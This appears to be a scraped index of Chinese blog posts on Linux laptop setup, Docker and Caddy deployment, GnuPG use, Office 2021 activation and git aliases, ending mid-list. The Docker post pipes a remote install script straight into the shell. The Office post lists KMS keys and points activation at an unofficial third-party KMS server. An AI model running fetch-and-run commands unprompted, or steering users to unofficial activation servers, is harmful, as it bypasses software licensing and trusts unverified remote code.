alike magic lamp effect Dash to dock No activities button Open Weather Privacy Quick Settings Menu Vitals 其他问题 下文会用到Aur软件源，可以在Aur - ArchLinux中找到更多信息。\nparu是一个Aur软件源的实用工具，可以自动获取安装Aur软件源内的程序，请访问Morganamilo/paru - Github了解查看paru的安装和使用。\nGnome无法正常挂载NTFS外接磁盘 可能是Gnome中的gvfs需要使用ntfs-3g中的一些实用工具才可以正确挂载NTFS磁盘。Linux内核5.15版本之后将ntfs驱动内置，因此可以通过以上命令单独安装使用内核ntfs驱动的ntfs实用工具。\n执行paru ntfsprogs-ntfs3 没有声音 本节参考：\nProblem summary of installing Ubuntu on AsusStrixScarG532 - MoeomuBlog ASUS ROG G533QS - ArchWiki 有以上两个解决方式，具体使用哪个请根据自己的喜好\nGPG问题 本节参考：GnuPG - ArchWiki\nioctl错误 指南：Invalid_IPC_response_and_Inappropriate_ioctl_for_device - ArchWiki\n将export GPG_TTY=$(tty)添加到环境变量中，例如.bashrc，.zshrc等文件中 将pinentry配置为Gnome3样式 不配置将会导致GPG无法找到图形界面的输入密码界面程序，进而导致更多的图形界面程序错误\n执行echo pinentry-program /usr/bin/pinentry-gnome3 \u0026gt;\u0026gt; .gnupg/gpg-agent.conf 键盘灯光和电源控制 在ASUS Linux阅读更多\n执行paru asusctl 执行paru rog-control-center 参考文献 [HowTo] Use Wayland with proprietary NVIDIA drivers. (2022, February 10). Manjaro Linux Forum. https://forum.manjaro.org/t/howto-use-wayland-with-proprietary-nvidia-drivers/36130 Arch Linux - Downloads. (n.d.). Archlinux.org. https://archlinux.org/download/ Arch Linux 源使用帮助 — USTC Mirror Help 文档. (n.d.). Mirrors.ustc.edu.cn. Retrieved October 26, 2022, from https://mirrors.ustc.edu.cn/help/archlinux.html ASUS NoteBook Linux. (n.d.). Asus-Linux.org. Retrieved October 26, 2022, from https://asus-linux.org/ ASUS ROG G533QS - ArchWiki. (n.d.). Wiki.archlinux.org. Retrieved October 26, 2022, from https://wiki.archlinux.org/title/ASUS_ROG_G533QS AUR (en) - Home. (n.d.). Aur.archlinux.org. https://aur.archlinux.org/ balenaEtcher - Home. (2020). BalenaEtcher. https://www.balena.io/etcher/ GnuPG - ArchWiki. (2018). Archlinux.org. https://wiki.archlinux.org/title/GnuPG Installation guide - ArchWiki. (n.d.). Wiki.archlinux.org. https://wiki.archlinux.org/title/Installation_guide iwd - ArchWiki. (n.d.). Wiki.archlinux.org. Retrieved October 26, 2022, from https://wiki.archlinux.org/title/Iwctl Linux Foundation Secure Boot System Released | James Bottomley’s random Pages. (n.d.). Retrieved October 26, 2022, from https://blog.hansenpartnership.com/linux-foundation-secure-boot-system-released/ Lulu. (2022, October 26). Paru. GitHub. https://github.com/Morganamilo/paru Misaka. (2022, October 20). Problem summary of installing Ubuntu on AsusStrixScarG532. Moeomu Blog. https://blog.moeomu.com/posts/problem-summary-of-installing-ubuntu-on-asusstrixscarg532/#system-sound-problems NetworkManager - ArchWiki. (n.d.). Wiki.archlinux.org. https://wiki.archlinux.org/title/NetworkManager NVIDIA - ArchWiki. (n.d.). Wiki.archlinux.org. Retrieved October 26, 2022, from https://wiki.archlinux.org/title/NVIDIA Unified Extensible Firmware Interface/Secure Boot - ArchWiki. (n.d.). Wiki.archlinux.org. https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot ","date":"2022-10-26T19:14:09+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20221026/00002-1464201810-install-system,-webpage-head-image,-beautiful,-ArchLinux.6mm7o4tdu64g.webp","permalink":"https://blog.moeomu.com/zh-cn/posts/%E5%9C%A8%E5%8D%8E%E7%A1%95%E7%8E%A9%E5%AE%B6%E5%9B%BD%E5%BA%A6%E6%9E%AA%E7%A5%9E4%E4%B8%8A%E5%AE%89%E8%A3%85archlinux/","title":"在华硕玩家国度枪神4上安装ArchLinux"},{"content":"本文来源: MoeomuBlog\n背景故事 有一些开源的服务非常想体验一下，但是无法部署在Paas这种服务上，或者能部署但是无法持久化存储一些文件。所以不久前自己购买了一个VPS，考虑到安全性使用Docker来部署所有服务，而本地的反向代理使用Caddy，而Caddy通过Cloudflare API自动从受Cloudflare CDN保护的DNS解析下获取和续期HTTPS证书。以下是我部署服务的全部过程，如果有错误和疏漏请一定指出。 本文将不会详细到每一条命令，而是描述一个大体的构建框架思路。 警告：如果忽略本文中具体段落的阅读官方文档的建议直接执行接下来的指令，很大概率会出错。这时候可以去仔细查看那一段提到的官方文档，或者在本文的评论区提问。\n创建Docker基本服务框架 创建用户 运行以下命令\n1 2 3 4 useradd -m mydocker usermod -s /bin/bash mydocker su mydocker curl -fsSL https://get.docker.com/rootless | sh 遵循Docker官方的Run the Docker daemon as a non-root user (Rootless mode) - Docker Document指南将您希望的配置项配置好\n创建Docker网络 docker network create caddy 部署Web服务 部署Alist服务 Alist的Github开源地址：alist - Github\nAlist部署指令 -d表示在后台运行 --name指定此Docker服务名称 -p 宿主机端口:容器端口指定绑定的端口 --network=caddy表示绑定的Docker Network -v 宿主机路径:容器内路径指定需要永久存储的文件位置 --restart=always表示服务停机重启。 1 2 3 4 5 6 docker run -d --name=\u0026#34;alist\u0026#34; \\ -p 5244:5244 \\ --network=caddy \\ -v $HOME/docker_data/alist:/opt/alist/data \\ --restart=always \\ xhofe/alist:latest 更多Alist参考指令 查看Alist密码：docker exec -it alist ./alist password 查看Alist日志：docker logs -f alist 部署Whoogle服务 部署指令如下，指令详情不再解释，和上文雷同 1 2 3 4 5 docker run -d --name whoogle \\ -p 5000:5000 \\ --network=caddy \\ --restart=always \\ benbusby/whoogle-search:latest 部署Caddy 先决条件 在使用Docker部署Caddy服务之前，需要先创建所需要的Caddyfile配置文件，以供Caddy服务自动配置使用。\nCaddyfile 创建永久存储位置：mkdir -p $HOME/docker_data/caddy/ 创建并编辑Caddyfile文件：vim $HOME/docker_data/caddy/Caddyfile Caddyfile\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (site_config) { tls me_tls@example.com { dns cloudflare {env.CLOUDFLARE_API_TOKEN} } # more config reverse_proxy {args.0} } drive.example.com { import site_config alist:5244 } search.example.com { import site_config whoogle:5000 } 补充说明：alist:5244和whoogle:5000能正常工作并正常被解析的原因是：这三个容器都存在于同一个Docker Network中，因此可以通过容器名称进行解析。\n使用Docker部署Caddy 部署指令如下，指令详情不再解释，和上文雷同 以下需要特别注意的是 your_cloudflare_login_email@example.com替换为你的cloudflare账号邮箱 your_cloudflare_api_token替换为你的cloudflare api token，你可以遵循Create an API token - Cloudflare Docs指南获取你的api token，注意这里创建的时候一定要选择Zone / DNS / Edit和Zone / Zone / Read权限 1 2 3 4 5 6 7 8 9 10 11 docker run -d --name=\u0026#34;caddy\u0026#34; \\ -p 443:443 \\ --network=caddy \\ -v $HOME/docker_data/caddy/Caddyfile:/etc/caddy/Caddyfile \\ -v $HOME/docker_data/caddy/data:/data \\ -v $HOME/docker_data/caddy/config:/config \\ -e CLOUDFLARE_EMAIL=your_cloudflare_login_email@example.com \\ -e CLOUDFLARE_API_TOKEN=your_cloudflare_api_token \\ -e ACME_AGREE=true \\ --restart=always \\ slothcroissant/caddy-cloudflaredns:latest 参考文献 Run the Docker daemon as a non-root user (Rootless mode). (2022, September 22). Docker Documentation. https://docs.docker.com/engine/security/rootless/ Docker Hub. (n.d.). Hub.docker.com. Retrieved October 24, 2022, from https://hub.docker.com/r/slothcroissant/caddy-cloudflaredns Unrecognized directive: dns. (2020, May 14). Caddy Community. https://caddy.community/t/unrecognized-directive-dns/8149/9 Server, C. W. (n.d.). Caddyfile Concepts - Caddy Documentation. Caddyserver.com. Retrieved October 24, 2022, from https://caddyserver.com/docs/caddyfile/concepts ","date":"2022-10-24T22:03:01+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20221026/00002-2908894140.26d7gclffj8g.webp","permalink":"https://blog.moeomu.com/zh-cn/posts/%E5%9C%A8%E4%B8%80%E5%8F%B0vps%E4%B8%8A%E9%83%A8%E7%BD%B2docker%E6%9C%8D%E5%8A%A1/","title":"在一台VPS上部署Docker服务"},{"content":"本文来源: MoeomuBlog\n声音的问题 问题一：没有声音 编辑文件：/etc/modprobe.d/alsa-base.conf 在这个文件的末尾添加一行：options snd-hda-intel model=asus-zenbook 重新启动系统 问题二：声音无法调整 描述：主声音不可调整，只能是静音或者最大声音。\n编辑文件：/usr/share/pulseaudio/alsa-mixer/paths/analog-output.conf.common\n在[Element PCM]的前面添加以下内容\n1 2 3 [Element Master] switch = mute volume = ignore 关闭pulse音频守护进程，它将被systemd自动重新启动：pulseaudio -k\n注意：请勿以root身份运行pulseaudio，否则将无法正常关闭守护进程。\n睡眠问题 锁定屏幕后无法再次唤醒 描述：锁定屏幕后，计算机不能再次唤醒。硬盘和其他硬件工作正常，但屏幕全黑。\n安装laptop-mod-tools：sudo apt install laptop-mod-tools 启动laptop-mod-tools：sudo laptop_mode start 添加mutter debug环境变量，编辑文件：/etc/environment 如果是Ubuntu 22.04: MUTTER_DEBUG_ENABLE_ATOMIC_KMS=0 如果是Ubuntu 22.10及以后版本：MUTTER_DEBUG_FORCE_KMS_MODE=simple 重新启动系统 参考文献 snd-hda-intel model for UBUNTU 20.04 installed in an ASUS ROG STRIX G15 (G512) - AskUbuntu Volume either muted or maxed out, nothing in between - ubuntu forums Blanked screen doesn\u0026rsquo;t wake up after locking - Launchpad ","date":"2022-10-20T13:22:01+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20221020/1880882405-install-Problem,-Ubuntu,-webpage-head-image.g4gmdlq05jc.webp","permalink":"https://blog.moeomu.com/zh-cn/posts/%E5%9C%A8rog%E6%9E%AA%E7%A5%9E4%E4%B8%8A%E5%AE%89%E8%A3%85ubuntu%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","title":"在ROG枪神4上安装Ubuntu遇到的问题和解决办法"},{"content":"本文来源：Moeomu的博客\nGnuPG介绍 官方介绍 来源：GnuPG\nGnuPG是RFC4880所定义的OpenPGP标准（也称为PGP）的完整和免费的实现。GnuPG允许你对你的数据和通信进行加密和签名；它有一个多功能的密钥管理系统，同时还有各种公钥目录的访问模块。GnuPG，也被称为GPG，是一个命令行工具，具有易于与其他应用程序集成的功能。有大量的前端应用程序和库可用。GnuPG还提供对S/MIME和安全外壳（ssh）的支持。\n自1997年推出以来，GnuPG是自由软件（意味着它尊重你的自由）。它可以在GNU通用公共许可证的条款下自由使用、修改和发布。\n争辩说你不关心隐私权，因为你没有什么可隐藏的，这与说你不关心言论自由，因为你没有什么可说的没有什么区别。\n\u0026ndash;爱德华·斯诺登\n使用加密技术有助于保护你的隐私和与你交流的人的隐私。加密使大量监控系统的生活变得困难。GnuPG是斯诺登用来揭开NSA秘密的工具之一。\n请访问电子邮件自卫网站，了解如何以及为什么你应该使用GnuPG进行电子通信。\n所以呢？ Q1: 为什么要使用GnuPG？ 因为它是自由软件，可以自由使用、修改和发布。 使用它，你的通讯信息将是加密的、安全的。 PGP能保证一条信息是你相信的人发的，除了你俩之外别人无法解密，而且这条消息在传送时中间没有经过任何哪怕是一个标点一个字节的修改。 经过PGP签名加密的消息可以在任何一条不可信信道上传输，而且中途无法被任何人篡改、解密。 Q2: 我明明不怕审查，身正不怕影子歪，你还有什么理由推荐GnuPG？ 您的隐私由您决定，大多数的人们都不希望生活在监控之下。 如果温和的批评也不被允许，沉默将被认为居心叵测。如果沉默也不再允许，赞扬不够卖力将是一种罪行。如果只允许一种声音存在，那么，唯一存在的那个声音就是谎言。 如果更加不幸地生活在极权主义国家，加密通讯能保护自己，保护自己所在乎的朋友们。 安装 Windows 推荐使用Gpg4win，它的套件齐全，有个容易使用的GUI。\n从Gpg4win下载适用于您计算机的版本。一般而言，如果您没有特殊需求，直接点击绿色的下载按钮即可。 macOS 推荐使用GPGSuite\n从GPGSuite下载适用于您计算机的版本。一般而言，如果您没有特殊需求，直接点击红色的下载按钮即可。 提醒：GPGSuite套件中的GPGMail是付费软件，如果您需要用它自动加密电子邮件，那么您需要购买GPGMail。但是请放心，文本和文件的加密签名完全是免费的。\nLinux 推荐使用GnuPG\n大多数Linux发行版都已经预置了GnuPG，您不需要安装任何软件。但是推荐您安装一个GUI管理界面GPA，因为它更加方便用户使用。 生成密钥 本节内容请先试验，熟练之后再生成自己主要使用的密钥。\n生成主密钥 输入命令gpg -expert --full-gen-key 选择密钥类型：默认 输入密钥长度：4096 输入密钥过期时间：2y（表示两年，可以输入0表示永不过期，您可以随时更改密钥到期时间），输入y以确认。 输入您的名字，这是个可选项，可以输入网名甚至可以不输入。 输入您的电子邮件，这是个可选项，甚至可以不输入。如果您希望使用电子邮件加密，那您必须输入。 输入备注，可以留空。 输入O确认信息无误，随后您需要输入一个密钥密码，开始生成密钥。 生成撤销证书 如果您丢失了主密钥（或者被夺取），您可以使用撤销证书来证明它不再使用。如果您没有撤销证书，那么您必须一个个通知朋友们。\n输入命令gpg --gen-revoke -ao revoke.pgp email@email.com #uid 或者key id 查看子密钥 主密钥日常不应该使用，日常您应该使用生成的子密钥。这样做的好处就是如果您泄漏了某个子密钥，您可以立即吊销这个子密钥，而不用废弃整个密钥对。\n列出所有公钥、子公钥：--list-keys或者gpg -k 列出所有密钥、子密钥：--list-secret-keys或者gpg -K 如果要查看密钥指纹信息，可以加上--fingerprint参数，比如gpg --list-secret-keys --fingerprint 如果要查看密钥ID信息，可以加上--keyid-format long参数，比如gpg --list-secret-keys --keyid-format long 导出密钥 既然日常使用要使用子密钥，那么主密钥不应该存在于同一个地方，GPG无法删除密钥，只能导出后只倒入需要的子密钥。\n注意：密钥ID后的感叹号不可缺少，否则将会导出所有密钥\n导出公钥 导出公钥：gpg -ao public-key --export 主密钥ID 导出主密钥 输入命令gpg -ao master-key --export-secret-key 主密钥ID! 导出子密钥 输入命令gpg -ao sub-key --export-secret-subkeys 子密钥ID! 导入密钥 输入命令gpg --import 文件名 和朋友们安全交流 您现在已经大功告成，养成日常使用PGP加密签名的习惯之后，相信您也很难离开它了 发布到公钥服务器 \u0026hellip;未完待续\u0026hellip;\n参考文献 Ulyc. (2021, January 13). 2021年，用更现代的方法使用PGP（上）. C的博客. https://ulyc.github.io/2021/01/13/2021年-用更现代的方法使用PGP-上/ Ulyc. (2021, January 13). 2021年，用更现代的方法使用PGP（中）. C的博客. https://ulyc.github.io/2021/01/13/2021年-用更现代的方法使用PGP-中/ Ulyc. (2021, January 13). 2021年，用更现代的方法使用PGP（下）. C的博客. https://ulyc.github.io/2021/01/13/2021年-用更现代的方法使用PGP-下/ ","date":"2022-06-28T08:58:01+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%9B%B4%E5%AE%89%E5%85%A8%E7%9A%84pgp%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","title":"更安全的PGP使用方法"},{"content":"本文来源：Moeomu的博客\n从Office Tool Plus安装office 下载Office Tool Plus 部署您希望的Office套件 选择您的KMS服务器 主机: kms.loli.beer 端口: 80 选择您的KMS密钥 Version KMS Key Office Professional Plus 2021 FXYTK-NJJ8C-GB6DW-3DYQT-6F7TH Office Standard 2021 KDX7X-BNVR8-TXXGX-4Q7Y8-78VT3 Project Professional 2021 FTNWT-C6WBT-8HMGF-K9PRX-QV9H8 Project Standard 2021 J2JDC-NJCYY-9RGQ4-YXWMH-T3D4T Visio Professional 2021 KNH8D-FGHT4-T8RK3-CTDYJ-K2HT4 Visio Standard 2021 MJVNY-BYWPY-CWV6J-2RKRT-4M8QG Access 2021 WM8YG-YNGDD-4JHDC-PG3F4-FC4T4 Excel 2021 NWG3X-87C9K-TC7YY-BC2G7-G6RVC Outlook 2021 C9FM6-3N72F-HFJXB-TM3V9-T86R9 PowerPoint 2021 TY7XF-NFRBR-KJ44C-G83KF-GX27K Publisher 2021 2MW9D-N4BXM-9VBPG-Q7W6M-KFBGQ Skype for Business 2021 HWCXN-K3WBT-WJBKY-R8BD9-XK29P Word 2019 TN8H9-M34D3-Y64V9-TR72V-X79KV Office Professional Plus 2019 NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP Office Standard 2019 6NWWJ-YQWMR-QKGCB-6TMB3-9D9HK Project Professional 2019 B4NPR-3FKK7-T2MBV-FRQ4W-PKD2B Project Standard 2019 C4F7P-NCP8C-6CQPT-MQHV9-JXD2M Visio Professional 2019 9BGNQ-K37YR-RQHF2-38RQ3-7VCBB Visio Standard 2019 7TQNQ-K3YQQ-3PFH7-CCPPM-X4VQ2 Access 2019 9N9PT-27V4Y-VJ2PD-YXFMF-YTFQT Excel 2019 TMJWT-YYNMB-3BKTF-644FC-RVXBD Outlook 2019 7HD7K-N4PVK-BHBCQ-YWQRW-XW4VK PowerPoint 2019 RRNCX-C64HY-W2MM7-MCH9G-TJHMQ Publisher 2019 G2KWX-3NW6P-PY93R-JXK2T-C9Y9V Skype for Business 2019 NCJ33-JHBBY-HTK98-MYCV8-HMKHJ Word 2019 PBX3G-NWMT6-Q7XBW-PYJGG-WXD33 Office Professional Plus 2016 XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 Office Mondo 2016 HFTND-W9MK4-8B7MJ-B6C4G-XQBR2 Office Standard 2016 JNRGM-WHDWX-FJJG3-K47QV-DRTFM Project Professional 2016 YG9NW-3K39V-2T3HJ-93F3Q-G83KT Project Standard 2016 GNFHQ-F6YQM-KQDGJ-327XX-KQBVC Visio Professional 2016 PD3PC-RHNGV-FXJ29-8JK7D-RJRJK Visio Standard 2016 7WHWN-4T7MP-G96JF-G33KR-W8GF4 Access 2016 GNH9Y-D2J4T-FJHGG-QRVH7-QPFDW Excel 2016 9C2PK-NWTVB-JMPW8-BFT28-7FTBF OneNote 2016 DR92N-9HTF2-97XKM-XW2WJ-XW3J6 Outlook 2016 R69KK-NTPKF-7M3Q4-QYBHW-6MT9B PowerPoint 2016 J7MQP-HNJ4Y-WJ7YM-PFYGF-BY6C6 Publisher 2016 F47MM-N3XJP-TQXJ9-BP99D-8K837 Skype for Business 2016 869NQ-FJ69K-466HW-QYCP2-DDBV6 Word 2016 WXY84-JN2Q9-RBCCQ-3Q3J3-3PFJ6 Office Professional Plus 2013 YC7DK-G2NP3-2QQC3-J6H88-GVGXT Office Mondo 2013 42QTK-RN8M7-J3C4G-BBGYM-88CYV Office Standard 2013 KBKQT-2NMXY-JJWGP-M62JB-92CD4 Project Professional 2013 FN8TT-7WMH6-2D4X9-M337T-2342K Project Standard 2013 6NTH3-CW976-3G3Y2-JK3TX-8QHTT Visio Professional 2013 C2FG9-N6J68-H8BTJ-BW3QX-RM3B3 Visio Standard 2013 J484Y-4NKBF-W2HMG-DBMJC-PGWR7 Access 2013 NG2JY-H4JBT-HQXYP-78QH9-4JM2D Excel 2013 VGPNG-Y7HQW-9RHP7-TKPV3-BG7GB InfoPath 2013 DKT8B-N7VXH-D963P-Q4PHY-F8894 Lync 2013 2MG3G-3BNTT-3MFW9-KDQW3-TCK7R OneNote 2013 TGN6P-8MMBC-37P2F-XHXXK-P34VW Outlook 2013 QPN8Q-BJBTJ-334K3-93TGY-2PMBT PowerPoint 2013 4NT99-8RJFH-Q2VDH-KYG2C-4RD4F Publisher 2013 PN2WF-29XG2-T9HJ7-JQPJR-FCXK4 Word 2013 6Q7VD-NX8JD-WJ2VH-88V73-4GBJ7 Office Professional Plus 2010 VYBBJ-TRJPB-QFQRF-QFT4D-H3GVB Office Mondo 2010 YBJTT-JG6MD-V9Q7P-DBKXJ-38W9R Office Standard 2010 V7QKV-4XVVR-XYV4D-F7DFM-8R6BM Office SmallBusBasics 2010 D6QFG-VBYP2-XQHM7-J97RH-VVRCK Project Professional 2010 YGX6F-PGV49-PGW3J-9BTGG-VHKC6 Project Standard 2010 4HP3K-88W3F-W2K3D-6677X-F9PGB Visio Premium 2010 D9DWC-HPYVV-JGF4P-BTWQB-WX8BJ Visio Professional 2010 7MCW8-VRQVK-G677T-PDJCM-Q8TCP Visio Standard 2010 767HD-QGMWX-8QTDB-9G3R2-KHFGJ Access 2010 V7Y44-9T38C-R2VJK-666HK-T7DDX Excel 2010 H62QG-HXVKF-PP4HP-66KMR-CW9BM Groove 2010 QYYW6-QP4CB-MBV6G-HYMCJ-4T3J4 InfoPath 2010 K96W8-67RPQ-62T9Y-J8FQJ-BT37T OneNote 2010 Q4Y4M-RHWJM-PY37F-MTKWH-D3XHX Outlook 2010 7YDC2-CWM8M-RRTJC-8MDVC-X3DWQ PowerPoint 2010 RC8FX-88JRY-3PF7C-X8P67-P4VTT Publisher 2010 BFK7F-9MYHM-V68C7-DRQ66-83YTP Word 2010 HVHB3-C6FV7-KQX9W-YQG79-CRY7T 激活Office 使用OTP激活 点击软件内激活即可 使用命令行激活 1 2 3 cscript \u0026#34;ospp.vbs\u0026#34; /inpkey:XXXXX-XXXXX-XXXXX-XXXXX-XXXXX(KMS 密钥) cscript \u0026#34;ospp.vbs\u0026#34; /sethst:kms.loli.beer(KMS 服务器地址) cscript \u0026#34;ospp.vbs\u0026#34; /act 参考文档 白, 小. (2018, November 1). 使用 KMS 激活 Microsoft 产品 - 犬\u0026rsquo;s Blog. Moedog. https://moedog.org/1117.html ","date":"2022-05-22T21:18:01+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BF%80%E6%B4%BBoffice2021/","title":"激活Office2021"},{"content":"本文来源：Moeomu的博客\nGit的命令缩写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 alias g=\u0026#39;git\u0026#39; alias ga=\u0026#39;git add\u0026#39; alias gaa=\u0026#39;git add --all\u0026#39; alias gapa=\u0026#39;git add --patch\u0026#39; alias gau=\u0026#39;git add --update\u0026#39; alias gav=\u0026#39;git add --verbose\u0026#39; alias gap=\u0026#39;git apply\u0026#39; alias gapt=\u0026#39;git apply --3way\u0026#39; alias gb=\u0026#39;git branch\u0026#39; alias gba=\u0026#39;git branch -a\u0026#39; alias gbd=\u0026#39;git branch -d\u0026#39; alias gbda=\u0026#39;git branch --no-color --merged | command grep -vE \u0026#34;^([+*]|\\s*($(git_main_branch)|$(git_develop_branch))\\s*$)\u0026#34; | command xargs git branch -d 2\u0026gt;/dev/null\u0026#39; alias gbD=\u0026#39;git branch -D\u0026#39; alias gbl=\u0026#39;git blame -b -w\u0026#39; alias gbnm=\u0026#39;git branch --no-merged\u0026#39; alias gbr=\u0026#39;git branch --remote\u0026#39; alias gbs=\u0026#39;git bisect\u0026#39; alias gbsb=\u0026#39;git bisect bad\u0026#39; alias gbsg=\u0026#39;git bisect good\u0026#39; alias gbsr=\u0026#39;git bisect reset\u0026#39; alias gbss=\u0026#39;git bisect start\u0026#39; alias gc=\u0026#39;git commit -v\u0026#39; alias gc!=\u0026#39;git commit -v --amend\u0026#39; alias gcn!=\u0026#39;git commit -v --no-edit --amend\u0026#39; alias gca=\u0026#39;git commit -v -a\u0026#39; alias gca!=\u0026#39;git commit -v -a --amend\u0026#39; alias gcan!=\u0026#39;git commit -v -a --no-edit --amend\u0026#39; alias gcans!=\u0026#39;git commit -v -a -s --no-edit --amend\u0026#39; alias gcam=\u0026#39;git commit -a -m\u0026#39; alias gcsm=\u0026#39;git commit -s -m\u0026#39; alias gcas=\u0026#39;git commit -a -s\u0026#39; alias gcasm=\u0026#39;git commit -a -s -m\u0026#39; alias gcb=\u0026#39;git checkout -b\u0026#39; alias gcf=\u0026#39;git config --list\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 alias gcl=\u0026#39;git clone --recurse-submodules\u0026#39; alias gclean=\u0026#39;git clean -id\u0026#39; alias gpristine=\u0026#39;git reset --hard \u0026amp;\u0026amp; git clean -dffx\u0026#39; alias gcm=\u0026#39;git checkout $(git_main_branch)\u0026#39; alias gcd=\u0026#39;git checkout $(git_develop_branch)\u0026#39; alias gcmsg=\u0026#39;git commit -m\u0026#39; alias gco=\u0026#39;git checkout\u0026#39; alias gcor=\u0026#39;git checkout --recurse-submodules\u0026#39; alias gcount=\u0026#39;git shortlog -sn\u0026#39; alias gcp=\u0026#39;git cherry-pick\u0026#39; alias gcpa=\u0026#39;git cherry-pick --abort\u0026#39; alias gcpc=\u0026#39;git cherry-pick --continue\u0026#39; alias gcs=\u0026#39;git commit -S\u0026#39; alias gcss=\u0026#39;git commit -S -s\u0026#39; alias gcssm=\u0026#39;git commit -S -s -m\u0026#39; alias gd=\u0026#39;git diff\u0026#39; alias gdca=\u0026#39;git diff --cached\u0026#39; alias gdcw=\u0026#39;git diff --cached --word-diff\u0026#39; alias gdct=\u0026#39;git describe --tags $(git rev-list --tags --max-count=1)\u0026#39; alias gds=\u0026#39;git diff --staged\u0026#39; alias gdt=\u0026#39;git diff-tree --no-commit-id --name-only -r\u0026#39; alias gdup=\u0026#39;git diff @{upstream}\u0026#39; alias gdw=\u0026#39;git diff --word-diff\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 alias gf=\u0026#39;git fetch\u0026#39; # --jobs=\u0026lt;n\u0026gt; was added in git 2.8 is-at-least 2.8 \u0026#34;$git_version\u0026#34; \\ \u0026amp;\u0026amp; alias gfa=\u0026#39;git fetch --all --prune --jobs=10\u0026#39; \\ || alias gfa=\u0026#39;git fetch --all --prune\u0026#39; alias gfo=\u0026#39;git fetch origin\u0026#39; alias gfg=\u0026#39;git ls-files | grep\u0026#39; alias gg=\u0026#39;git gui citool\u0026#39; alias gga=\u0026#39;git gui citool --amend\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 alias ggpur=\u0026#39;ggu\u0026#39; alias ggpull=\u0026#39;git pull origin \u0026#34;$(git_current_branch)\u0026#34;\u0026#39; alias ggpush=\u0026#39;git push origin \u0026#34;$(git_current_branch)\u0026#34;\u0026#39; alias ggsup=\u0026#39;git branch --set-upstream-to=origin/$(git_current_branch)\u0026#39; alias gpsup=\u0026#39;git push --set-upstream origin $(git_current_branch)\u0026#39; alias ghh=\u0026#39;git help\u0026#39; alias gignore=\u0026#39;git update-index --assume-unchanged\u0026#39; alias gignored=\u0026#39;git ls-files -v | grep \u0026#34;^[[:lower:]]\u0026#34;\u0026#39; alias git-svn-dcommit-push=\u0026#39;git svn dcommit \u0026amp;\u0026amp; git push github $(git_main_branch):svntrunk\u0026#39; alias gk=\u0026#39;\\gitk --all --branches \u0026amp;!\u0026#39; alias gke=\u0026#39;\\gitk --all $(git log -g --pretty=%h) \u0026amp;!\u0026#39; alias gl=\u0026#39;git pull\u0026#39; alias glg=\u0026#39;git log --stat\u0026#39; alias glgp=\u0026#39;git log --stat -p\u0026#39; alias glgg=\u0026#39;git log --graph\u0026#39; alias glgga=\u0026#39;git log --graph --decorate --all\u0026#39; alias glgm=\u0026#39;git log --graph --max-count=10\u0026#39; alias glo=\u0026#39;git log --oneline --decorate\u0026#39; alias glol=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ar) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39;\u0026#34; alias glols=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ar) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39; --stat\u0026#34; alias glod=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ad) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39;\u0026#34; alias glods=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ad) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39; --date=short\u0026#34; alias glola=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ar) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39; --all\u0026#34; alias glog=\u0026#39;git log --oneline --decorate --graph\u0026#39; alias gloga=\u0026#39;git log --oneline --decorate --graph --all\u0026#39; alias glp=\u0026#34;_git_log_prettily\u0026#34; alias gm=\u0026#39;git merge\u0026#39; alias gmom=\u0026#39;git merge origin/$(git_main_branch)\u0026#39; alias gmtl=\u0026#39;git mergetool --no-prompt\u0026#39; alias gmtlvim=\u0026#39;git mergetool --no-prompt --tool=vimdiff\u0026#39; alias gmum=\u0026#39;git merge upstream/$(git_main_branch)\u0026#39; alias gma=\u0026#39;git merge --abort\u0026#39; alias gp=\u0026#39;git push\u0026#39; alias gpd=\u0026#39;git push --dry-run\u0026#39; alias gpf=\u0026#39;git push --force-with-lease\u0026#39; alias gpf!=\u0026#39;git push --force\u0026#39; alias gpoat=\u0026#39;git push origin --all \u0026amp;\u0026amp; git push origin --tags\u0026#39; alias gpr=\u0026#39;git pull --rebase\u0026#39; alias gpu=\u0026#39;git push upstream\u0026#39; alias gpv=\u0026#39;git push -v\u0026#39; alias gr=\u0026#39;git remote\u0026#39; alias gra=\u0026#39;git remote add\u0026#39; alias grb=\u0026#39;git rebase\u0026#39; alias grba=\u0026#39;git rebase --abort\u0026#39; alias grbc=\u0026#39;git rebase 